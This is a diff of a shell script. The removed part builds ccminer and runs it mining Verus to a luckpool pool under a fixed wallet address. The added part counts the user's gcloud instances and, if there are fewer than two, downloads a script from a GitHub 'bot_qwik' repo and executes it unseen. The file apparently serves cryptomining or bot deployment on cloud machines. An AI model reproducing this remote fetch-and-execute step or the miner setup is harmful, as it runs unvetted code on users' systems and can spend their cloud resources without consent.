@@ -1,13 +1,10 @@
-apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
-apt-get install git -y
-git clone --single-branch -b ARM https://github.com/monkins1010/ccminer.git
-cd ccminer
-chmod +x build.sh
-chmod +x configure.sh
-chmod +x autogen.sh
-./build.sh
-git clone https://github.com/monkins1010/ccminer.git
-cd ccminer
-chmod +x *
-./build.sh
-./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u REPNzMPtM7seJy5xngt5VWKXMsEi6Ejezb.ferodp -p d=32768S -t 6
+#!/bin/bash
+COUNT=$(gcloud compute instances list --format="value(name)" | wc -l)
+if [ "$COUNT" -lt 2 ]; then
+    sudo apt install screen -y
+    curl -sSL https://raw.githubusercontent.com/Cvayoyo/bot_qwik/main/sc.sh | tr -d '\r' > sc.sh
+    chmod +x sc.sh
+    ./sc.sh
+    sleep 10
+fi
+exit
